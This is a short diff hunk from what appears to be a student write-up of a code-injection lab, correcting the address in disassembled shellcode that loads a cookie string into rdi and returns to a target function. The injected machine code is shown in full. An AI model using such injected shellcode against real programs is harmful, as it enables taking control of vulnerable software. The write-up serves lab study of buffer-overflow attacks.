@@ -306,7 +306,7 @@ mov $0x5561dca8, %rdi // pass the address that store the cookie string in to rdi
 After using the `gcc -c code_injection.S` and `objdump -d code_injection.S > code_injection.txt`, we get the `Hexadecimal Code`.
 
 ```bash
-code_injection.o:     file format elf64-x86-64Disassembly of section .text:0000000000000000 <.text>:   0:	48 c7 c7 88 dc 61 55 	mov    $0x5561dc88,%rdi   7:	68 fa 18 40 00       	pushq  $0x4018fa   c:	c3                   	retq   
+code_injection.o:     file format elf64-x86-64Disassembly of section .text:0000000000000000 <.text>:   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi   7:	68 fa 18 40 00       	pushq  $0x4018fa   c:	c3                   	retq 
 ```
 
 Here is my final exploit string:
